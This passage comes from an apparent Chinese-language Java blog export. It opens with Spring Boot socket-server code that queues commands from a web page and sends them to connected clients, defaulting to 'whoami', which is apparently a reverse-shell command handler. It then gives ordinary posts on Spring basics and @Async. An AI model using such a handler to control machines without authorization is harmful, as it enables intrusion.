&#123;</span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * 阻塞队列，存储返回的数据</span><br><span class=\"line\">     */</span><br><span class=\"line\">    private Map&lt;String, LinkedBlockingQueue&lt;String&gt;&gt; ins ;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    private static final InMsgQueue instance = new InMsgQueue();</span><br><span class=\"line\"></span><br><span class=\"line\">    private InMsgQueue()&#123;</span><br><span class=\"line\">        ins =  new HashMap&lt;String, LinkedBlockingQueue&lt;String&gt;&gt;();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static final InMsgQueue getInstance()&#123;</span><br><span class=\"line\">        return instance;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public Map&lt;String, LinkedBlockingQueue&lt;String&gt;&gt; getDatas()&#123;</span><br><span class=\"line\">        return this.ins;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>OutMsgQueue:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/**</span><br><span class=\"line\"> * 维护要执行的命令</span><br><span class=\"line\"> */</span><br><span class=\"line\">public class OutMsgQueue &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * 阻塞队列，存储页面输入的命令</span><br><span class=\"line\">     */</span><br><span class=\"line\">    private Map&lt;String, LinkedBlockingQueue&lt;String&gt;&gt; outs ;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    private static final OutMsgQueue instance = new OutMsgQueue();</span><br><span class=\"line\"></span><br><span class=\"line\">    private OutMsgQueue()&#123;</span><br><span class=\"line\">        outs =  new HashMap&lt;String, LinkedBlockingQueue&lt;String&gt;&gt;();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static final OutMsgQueue getInstance()&#123;</span><br><span class=\"line\">        return instance;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public Map&lt;String, LinkedBlockingQueue&lt;String&gt;&gt; getDatas()&#123;</span><br><span class=\"line\">        return this.outs;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h6 id=\"2-sockerServer\"><a href=\"#2-sockerServer\" class=\"headerlink\" title=\"(2)sockerServer\"></a>(2)sockerServer</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/**</span><br><span class=\"line\"> * 单例创建全局socketserver</span><br><span class=\"line\"> */</span><br><span class=\"line\">public class SocketServer &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    private ServerSocket server = null;</span><br><span class=\"line\">    private int port = 12354;</span><br><span class=\"line\">    private final static int minPort = 1023;</span><br><span class=\"line\">    private final static int maxPort = 65535;</span><br><span class=\"line\">    private static final  SocketServer instance = new SocketServer();</span><br><span class=\"line\"></span><br><span class=\"line\">    private SocketServer()&#123;</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            if(port &gt;= minPort &amp;&amp; port &lt;= maxPort)&#123;</span><br><span class=\"line\">                server = new ServerSocket(port);</span><br><span class=\"line\">            &#125;else &#123;</span><br><span class=\"line\">                server = new ServerSocket(12354);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;catch (IOException e)&#123;</span><br><span class=\"line\">            System.out.println(&quot;sockerserver 创建失败 &quot; + e.getMessage());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static final SocketServer getInstance()&#123;</span><br><span class=\"line\">        return instance;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public ServerSocket getServer()&#123;</span><br><span class=\"line\">        return this.server;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public void setPort(int port)&#123;</span><br><span class=\"line\">        this.port = port;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    public int getPort()&#123;</span><br><span class=\"line\">        return this.port;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<h6 id=\"3-处理链接\"><a href=\"#3-处理链接\" class=\"headerlink\" title=\"(3)处理链接\"></a>(3)处理链接</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * 处理单个socket的服务类</span><br><span class=\"line\"> * 普通的socket消息收发,通过阻塞队列与页面进行交互</span><br><span class=\"line\"> */</span><br><span class=\"line\">public class SocketThread implements Runnable&#123;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    private Socket socket = null;</span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * 每个socket的对应id</span><br><span class=\"line\">     */</span><br><span class=\"line\">    private String id;</span><br><span class=\"line\"></span><br><span class=\"line\">    public SocketThread(Socket socket)&#123;</span><br><span class=\"line\">        this.socket = socket;</span><br><span class=\"line\">        this.id = socket.getInetAddress().getHostAddress() + &quot;:&quot; + socket.getPort();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void run()&#123;</span><br><span class=\"line\">        Map&lt;String, LinkedBlockingQueue&lt;String&gt;&gt; mapIn = InMsgQueue.getInstance().getDatas();</span><br><span class=\"line\">        Map&lt;String, LinkedBlockingQueue&lt;String&gt;&gt; mapOut = OutMsgQueue.getInstance().getDatas();</span><br><span class=\"line\">        LinkedBlockingQueue&lt;String&gt; queueOut = mapOut.get(id);</span><br><span class=\"line\">        LinkedBlockingQueue&lt;String&gt; queueIn = mapIn.get(id);</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));</span><br><span class=\"line\">            OutputStream out = socket.getOutputStream();</span><br><span class=\"line\">            String line = null;</span><br><span class=\"line\">            while (true)&#123;</span><br><span class=\"line\">                StringBuilder sb = new StringBuilder();</span><br><span class=\"line\">                // 999999999 结束标志</span><br><span class=\"line\">                while (!(line = in.readLine()).equals(&quot;999999999&quot;))&#123;</span><br><span class=\"line\">                    sb.append(line);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                System.out.println(&quot;[+]: &quot; + sb.toString());</span><br><span class=\"line\">                if(sb.toString().equals(&quot;exit()&quot;))&#123;</span><br><span class=\"line\">                    break;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                try &#123;</span><br><span class=\"line\">                    queueIn.put(sb.toString());</span><br><span class=\"line\">                &#125;catch (InterruptedException e2)&#123;</span><br><span class=\"line\">                    e2.printStackTrace();</span><br><span class=\"line\">                    queueIn.offer(e2.getMessage());</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                //读取队列中的命令，send</span><br><span class=\"line\">                try &#123;</span><br><span class=\"line\">                    //阻塞等待页面输入</span><br><span class=\"line\">                    out.write(queueOut.take().getBytes());</span><br><span class=\"line\">                &#125;catch (InterruptedException e1)&#123;</span><br><span class=\"line\">                    e1.printStackTrace();</span><br><span class=\"line\">                    out.write(&quot;whoami&quot;.getBytes());</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            in.close();</span><br><span class=\"line\">            out.close();</span><br><span class=\"line\">        &#125;catch (IOException e)&#123;</span><br><span class=\"line\">            System.out.println(e.getMessage());</span><br><span class=\"line\">        &#125;finally &#123;</span><br><span class=\"line\">            //删除队列中的连接信息</span><br><span class=\"line\">            mapIn.remove(id);</span><br><span class=\"line\">            mapOut.remove(id);</span><br><span class=\"line\">            try &#123;</span><br><span class=\"line\">                if (socket != null)&#123;</span><br><span class=\"line\">                    socket.close();</span><br><span class=\"line\">                    System.out.println(&quot;[*]: 异常，关闭socket&quot; + id);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;catch (IOException e)&#123;</span><br><span class=\"line\">                System.out.println(&quot;[*]: &quot; + id + &quot; 未正常关闭！ &quot; + e.getMessage());</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public void setSocket(Socket socket)&#123;</span><br><span class=\"line\">        this.socket = socket;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<h6 id=\"4-使用多线程处理不同socket\"><a href=\"#4-使用多线程处理不同socket\" class=\"headerlink\" title=\"(4)使用多线程处理不同socket\"></a>(4)使用多线程处理不同socket</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">**</span><br><span class=\"line\"> * 自动启动socket监听</span><br><span class=\"line\"> */</span><br><span class=\"line\">//控制bean的加载顺序  确保不为null</span><br><span class=\"line\">@DependsOn(&#123;&quot;socketLogService&quot;,&quot;springUtil&quot;&#125;)</span><br><span class=\"line\">@Component</span><br><span class=\"line\">public class StartSocket implements ApplicationRunner &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    SocketLogService socketLogService = (SocketLogService)SpringUtil.getBean(&quot;socketLogService&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void run(ApplicationArguments args)&#123;</span><br><span class=\"line\">        ServerSocket server = SocketServer.getInstance().getServer();</span><br><span class=\"line\">        ThreadPoolExecutor executor = new ThreadPoolExecutor(4,4,24*60,</span><br><span class=\"line\">                TimeUnit.MINUTES,new LinkedBlockingQueue&lt;&gt;());</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            while (true) &#123;</span><br><span class=\"line\">                Socket socket = server.accept();</span><br><span class=\"line\">                //连接日志</span><br><span class=\"line\">                SocketLogEntity entity = new SocketLogEntity();</span><br><span class=\"line\">                entity.setClientIp(socket.getInetAddress().getHostAddress());</span><br><span class=\"line\">                entity.setClientPort(socket.getPort());</span><br><span class=\"line\">                socketLogService.insertLog(entity);</span><br><span class=\"line\">                //新来一个连接时，更新队列</span><br><span class=\"line\">                Map&lt;String, LinkedBlockingQueue&lt;String&gt;&gt; mapIn = InMsgQueue.getInstance().getDatas();</span><br><span class=\"line\">                Map&lt;String, LinkedBlockingQueue&lt;String&gt;&gt; mapOut = OutMsgQueue.getInstance().getDatas();</span><br><span class=\"line\">                String ip = socket.getInetAddress().getHostAddress() + &quot;:&quot; + socket.getPort();</span><br><span class=\"line\">                if (!mapIn.containsKey(ip)) &#123;</span><br><span class=\"line\">                    mapOut.put(ip, new LinkedBlockingQueue&lt;String&gt;());</span><br><span class=\"line\">                    mapIn.put(ip, new LinkedBlockingQueue&lt;String&gt;());</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                //开单独的线程进行处理连接</span><br><span class=\"line\">                executor.execute(new SocketThread(socket));</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;catch (IOException e)&#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"2-nio\"><a href=\"#2-nio\" class=\"headerlink\" title=\"2.nio\"></a>2.nio</h4><h4 id=\"3-netty\"><a href=\"#3-netty\" class=\"headerlink\" title=\"3.netty\"></a>3.netty</h4>"},{"title":"spring基本概念一","date":"2018-09-21T20:30:54.000Z","_content":">   2019/6/22重新编辑\n\n### 1.为什么要有spring\n根本目的: <strong>简化java应用的开发</strong>。<br>\n- 利用容器管理bean\n- 通过依赖注入和面向接口实现松耦合。\n- 使用切面，简化开发\n\n### 2.Spring一些基本概念\n- 容器\n\n就是一个存放东西还能随时取出来的地方\n\n\n- Bean\n\n即Java对象，交于容器进行管理\n\n- Ioc(控制反转)\n\n将对象交给第三方容器( Spring 中的 Ioc 容器)来创建和管理。\n\n- DI(依赖注入)\n\n依赖注入也是控制反转，将创建某个对象(bean)的权力，反转交给容器，由容器创建，并注入到需要引用的bean中去。\n\n\n- AOP(切面)\n\n在特定的地方，插入我i们想要执行的代码。不改变原有代码(低侵入).\n\n###### 为什么要有控制反转和切面\n可以解耦和(Ioc)，抽象重复代码，提供一种编程思路(Aop).\n\n\n### 3.spring优缺点\n优：\n- 简化编程，配置简单,让使用者只关心核心业务的开发，框架帮你屏蔽原有技术跟业务开发无关的各类技术问题\n- 解耦和\n- 因为bean的依赖注入，易于单元测试\n\n缺:\n","source":"_posts/java/spring/spring.md","raw":"---\ntitle: spring基本概念一\ndate: 2018-09-21 16:30:54\ntags: [java,spring]\n---\n>   2019/6/22重新编辑\n\n### 1.为什么要有spring\n根本目的: <strong>简化java应用的开发</strong>。<br>\n- 利用容器管理bean\n- 通过依赖注入和面向接口实现松耦合。\n- 使用切面，简化开发\n\n### 2.Spring一些基本概念\n- 容器\n\n就是一个存放东西还能随时取出来的地方\n\n\n- Bean\n\n即Java对象，交于容器进行管理\n\n- Ioc(控制反转)\n\n将对象交给第三方容器( Spring 中的 Ioc 容器)来创建和管理。\n\n- DI(依赖注入)\n\n依赖注入也是控制反转，将创建某个对象(bean)的权力，反转交给容器，由容器创建，并注入到需要引用的bean中去。\n\n\n- AOP(切面)\n\n在特定的地方，插入我i们想要执行的代码。不改变原有代码(低侵入).\n\n###### 为什么要有控制反转和切面\n可以解耦和(Ioc)，抽象重复代码，提供一种编程思路(Aop).\n\n\n### 3.spring优缺点\n优：\n- 简化编程，配置简单,让使用者只关心核心业务的开发，框架帮你屏蔽原有技术跟业务开发无关的各类技术问题\n- 解耦和\n- 因为bean的依赖注入，易于单元测试\n\n缺:\n","slug":"java/spring/spring","published":1,"updated":"2019-10-13T12:15:12.172Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321lm004g6dcpksqelgfb","content":"<blockquote>\n<p>  2019/6/22重新编辑</p>\n</blockquote>\n<h3 id=\"1-为什么要有spring\"><a href=\"#1-为什么要有spring\" class=\"headerlink\" title=\"1.为什么要有spring\"></a>1.为什么要有spring</h3><p>根本目的: <strong>简化java应用的开发</strong>。<br></p>\n<ul>\n<li>利用容器管理bean</li>\n<li>通过依赖注入和面向接口实现松耦合。</li>\n<li>使用切面，简化开发</li>\n</ul>\n<h3 id=\"2-Spring一些基本概念\"><a href=\"#2-Spring一些基本概念\" class=\"headerlink\" title=\"2.Spring一些基本概念\"></a>2.Spring一些基本概念</h3><ul>\n<li>容器</li>\n</ul>\n<p>就是一个存放东西还能随时取出来的地方</p>\n<ul>\n<li>Bean</li>\n</ul>\n<p>即Java对象，交于容器进行管理</p>\n<ul>\n<li>Ioc(控制反转)</li>\n</ul>\n<p>将对象交给第三方容器( Spring 中的 Ioc 容器)来创建和管理。</p>\n<ul>\n<li>DI(依赖注入)</li>\n</ul>\n<p>依赖注入也是控制反转，将创建某个对象(bean)的权力，反转交给容器，由容器创建，并注入到需要引用的bean中去。</p>\n<ul>\n<li>AOP(切面)</li>\n</ul>\n<p>在特定的地方，插入我i们想要执行的代码。不改变原有代码(低侵入).</p>\n<h6 id=\"为什么要有控制反转和切面\"><a href=\"#为什么要有控制反转和切面\" class=\"headerlink\" title=\"为什么要有控制反转和切面\"></a>为什么要有控制反转和切面</h6><p>可以解耦和(Ioc)，抽象重复代码，提供一种编程思路(Aop).</p>\n<h3 id=\"3-spring优缺点\"><a href=\"#3-spring优缺点\" class=\"headerlink\" title=\"3.spring优缺点\"></a>3.spring优缺点</h3><p>优：</p>\n<ul>\n<li>简化编程，配置简单,让使用者只关心核心业务的开发，框架帮你屏蔽原有技术跟业务开发无关的各类技术问题</li>\n<li>解耦和</li>\n<li>因为bean的依赖注入，易于单元测试</li>\n</ul>\n<p>缺:</p>\n","site":{"data":{}},"excerpt":"","more":"<blockquote>\n<p>  2019/6/22重新编辑</p>\n</blockquote>\n<h3 id=\"1-为什么要有spring\"><a href=\"#1-为什么要有spring\" class=\"headerlink\" title=\"1.为什么要有spring\"></a>1.为什么要有spring</h3><p>根本目的: <strong>简化java应用的开发</strong>。<br></p>\n<ul>\n<li>利用容器管理bean</li>\n<li>通过依赖注入和面向接口实现松耦合。</li>\n<li>使用切面，简化开发</li>\n</ul>\n<h3 id=\"2-Spring一些基本概念\"><a href=\"#2-Spring一些基本概念\" class=\"headerlink\" title=\"2.Spring一些基本概念\"></a>2.Spring一些基本概念</h3><ul>\n<li>容器</li>\n</ul>\n<p>就是一个存放东西还能随时取出来的地方</p>\n<ul>\n<li>Bean</li>\n</ul>\n<p>即Java对象，交于容器进行管理</p>\n<ul>\n<li>Ioc(控制反转)</li>\n</ul>\n<p>将对象交给第三方容器( Spring 中的 Ioc 容器)来创建和管理。</p>\n<ul>\n<li>DI(依赖注入)</li>\n</ul>\n<p>依赖注入也是控制反转，将创建某个对象(bean)的权力，反转交给容器，由容器创建，并注入到需要引用的bean中去。</p>\n<ul>\n<li>AOP(切面)</li>\n</ul>\n<p>在特定的地方，插入我i们想要执行的代码。不改变原有代码(低侵入).</p>\n<h6 id=\"为什么要有控制反转和切面\"><a href=\"#为什么要有控制反转和切面\" class=\"headerlink\" title=\"为什么要有控制反转和切面\"></a>为什么要有控制反转和切面</h6><p>可以解耦和(Ioc)，抽象重复代码，提供一种编程思路(Aop).</p>\n<h3 id=\"3-spring优缺点\"><a href=\"#3-spring优缺点\" class=\"headerlink\" title=\"3.spring优缺点\"></a>3.spring优缺点</h3><p>优：</p>\n<ul>\n<li>简化编程，配置简单,让使用者只关心核心业务的开发，框架帮你屏蔽原有技术跟业务开发无关的各类技术问题</li>\n<li>解耦和</li>\n<li>因为bean的依赖注入，易于单元测试</li>\n</ul>\n<p>缺:</p>\n"},{"title":"spring异步调用","date":"2019-06-28T15:08:54.000Z","_content":"\n### 1.快速上手\n\n###### 1.添加@EnableAsync\n```\n@Configuration\n@EnableAsync\npublic class AsyncConfig {\n}\n\n```\n###### 2.异步方法\n```\n/**\n * 要执行的异步任务\n */\n@Component\npublic class AsyncDoThings {\n\n    public void doThing1() throws Exception{\n        System.out.println(\"[*] doThing1 Start : \" + System.currentTimeMillis());\n        Thread.sleep(10000);\n        System.out.println(\"[*] doThing1 end: \" + System.currentTimeMillis());\n    }\n\n    @Async\n    public void AsyncDoThing1() throws Exception{\n        System.out.println(\"[*] AsyncDoThing1 Start : \" + System.currentTimeMillis());\n        Thread.sleep(10000);\n        System.out.println(\"[*] AsyncDoThing1 end: \" + System.currentTimeMillis());\n    }\n```\n###### 3.执行\n```\n@RunWith(SpringRunner.class)\n@SpringBootTest\npublic class SpringbootDemoApplicationTests {\n\n    @Autowired\n    AsyncDoThings asyncDoThings;\n\n    @Test\n    public void contextLoads() throws Exception{\n        asyncDoThings.doThing1();\n        asyncDoThings.AsyncDoThing1();\n        asyncDoThings.doThing1();\n    }\n\n}\n```\n###### 4.结果\n可以看到  异步任务 开始后，下一个任务立即执行，未发生阻塞等待<br>\n![Async1](http://67.216.218.49:8000/file/blogs/java/spring/Async1.png)\n\n### 2.稍微深入\n\n###### 1.使用自己的线程池\n\n实现AsyncConfiguer接口<br>\n```\n/**\n * 异步任务配置类\n */\n@Configuration\n@EnableAsync\npublic class AsyncConfig implements AsyncConfigurer {\n\n    /**\n     * 使用自己的线程池\n     * @return\n     */\n    @Override\n    public Executor getAsyncExecutor(){\n        ThreadPoolTaskExecutor executor = new ThreadPoolTaskExecutor();\n        executor.setCorePoolSize(5);\n        executor.setMaxPoolSize(20);\n        executor.setQueueCapacity(200);\n        executor.setKeepAliveSeconds(60*30);\n        //等待任务在关机时完成--表明等待所有线程执行完\n        executor.setWaitForTasksToCompleteOnShutdown(true);\n        //线程名前缀\n        executor.setThreadNamePrefix(\"MyAsync-\");\n        executor.initialize();\n        return executor;\n    }\n\n    /**\n     * 处理异步任务中发生的异常\n     * @return\n     */\n    @Override\n    public AsyncUncaughtExceptionHandler getAsyncUncaughtExceptionHandler(){\n        //return new AsyncExecuteExceptionHandler();\n        return new SimpleAsyncUncaughtExceptionHandler();\n    }\n\n    class AsyncExecuteExceptionHandler implements AsyncUncaughtExceptionHandler{\n        @Override\n        public void handleUncaughtException(Throwable ex, Method method, Object... params){\n            System.out.println(\"[*]: 异步任务发生异常 \" + ex.getMessage());\n        }\n\n    }\n\n}\n\n```\n\n###### 2.获取异步任务的返回结果\n\n```\n/**\n * 要执行的异步任务\n */\n@Component\npublic class AsyncDoThings {\n\n    public void doThing1() throws Exception{\n        System.out.println(\"[*] doThing1 Start : \" + System.currentTimeMillis());\n        System.out.println(\"[*] threadname \" + Thread.currentThread().getName() );\n        Thread.sleep(1000);\n        System.out.println(\"[*] doThing1 end: \" + System.currentTimeMillis());\n    }\n\n    @Async\n    public void AsyncDoThing1() throws Exception{\n        System.out.println(\"[*] AsyncDoThing1 Start : \" + System.currentTimeMillis());\n        System.out.println(\"[*] threadname \" + Thread.currentThread().getName() );\n        Thread.sleep(3000);\n        System.out.println(\"[*] AsyncDoThing1 end: \" + System.currentTimeMillis());\n    }\n\n    //获取返回结果\n    @Async\n    public Future<String> AsyncWithResponse(String tips) throws Exception{\n        System.out.println(\"[*] AsyncWithResponse Start : \" + System.currentTimeMillis());\n        System.out.println(\"[*] threadname \" + Thread.currentThread().getName() );\n        Thread.sleep(3000);\n        System.out.println(\"[*] AsyncWithResponse end: \" + System.currentTimeMillis());\n        return new AsyncResult<>(tips + \" : finished! \");\n    }\n}\n\n//测试类中\n@Test\npublic void contextLoads() throws Exception{\n    asyncDoThings.doThing1();\n    asyncDoThings.AsyncDoThing1();\n    asyncDoThings.doThing1();\n\n    Future future = asyncDoThings.AsyncWithResponse(\"AsyncWithRes \");\n    System.out.println(\"[*]: \"  + Thread.currentThread().getName() + \" \" + future.get());\n}\n```\n\n###### 3.结果\n![Async2](http://67.216.218.49:8000/file/blogs/java/spring/Async2.png)\n","source":"_posts/java/spring/springAsync.md","raw":"---\ntitle: spring异步调用\ndate: 2019-06-28 11:08:54\ntags: [java,spring]\n---\n\n### 1.快速上手\n\n###### 1.添加@EnableAsync\n```\n@Configuration\n@EnableAsync\npublic class AsyncConfig {\n}\n\n```\n###### 2.异步方法\n```\n/**\n * 要执行的异步任务\n */\n@Component\npublic class AsyncDoThings {\n\n    public void doThing1() throws Exception{\n        System.out.println(\"[*] doThing1 Start : \" + System.currentTimeMillis());\n        Thread.sleep(10000);\n        System.out.println(\"[*] doThing1 end: \" + System.currentTimeMillis());\n    }\n\n    @Async\n    public void AsyncDoThing1() throws Exception{\n        System.out.println(\"[*] AsyncDoThing1 Start : \" + System.currentTimeMillis());\n        Thread.sleep(10000);\n        System.out.println(\"[*] AsyncDoThing1 end: \" + System.currentTimeMillis());\n    }\n```\n###### 3.执行\n```\n@RunWith(SpringRunner.class)\n@SpringBootTest\npublic class SpringbootDemoApplicationTests {\n\n    @Autowired\n    AsyncDoThings asyncDoThings;\n\n    @Test\n    public void contextLoads() throws Exception{\n        asyncDoThings.doThing1();\n        asyncDoThings.AsyncDoThing1();\n        asyncDoThings.doThing1();\n    }\n\n}\n```\n###### 4.结果\n可以看到  异步任务 开始后，下一个任务立即执行，未发生阻塞等待<br>\n![Async1](http://67.216.218.49:8000/file/blogs/java/spring/Async1.png)\n\n### 2.稍微深入\n\n###### 1.使用自己的线程池\n\n实现AsyncConfiguer接口<br>\n```\n/**\n * 异步任务配置类\n */\n@Configuration\n@EnableAsync\npublic class AsyncConfig implements AsyncConfigurer {\n\n    /**\n     * 使用自己的线程池\n     * @return\n     */\n    @Override\n    public Executor getAsyncExecutor(){\n        ThreadPoolTaskExecutor executor = new ThreadPoolTaskExecutor();\n        executor.setCorePoolSize(5);\n        executor.setMaxPoolSize(20);\n        executor.setQueueCapacity(200);\n        executor.setKeepAliveSeconds(60*30);\n        //等待任务在关机时完成--表明等待所有线程执行完\n        executor.setWaitForTasksToCompleteOnShutdown(true);\n        //线程名前缀\n        executor.setThreadNamePrefix(\"MyAsync-\");\n        executor.initialize();\n        return executor;\n    }\n\n    /**\n     * 处理异步任务中发生的异常\n     * @return\n     */\n    @Override\n    public AsyncUncaughtExceptionHandler getAsyncUncaughtExceptionHandler(){\n        //return new AsyncExecuteExceptionHandler();\n        return new SimpleAsyncUncaughtExceptionHandler();\n    }\n\n    class AsyncExecuteExceptionHandler implements AsyncUncaughtExceptionHandler{\n        @Override\n        public void handleUncaughtException(Throwable ex, Method method, Object... params){\n            System.out.println(\"[*]: 异步任务发生异常 \" 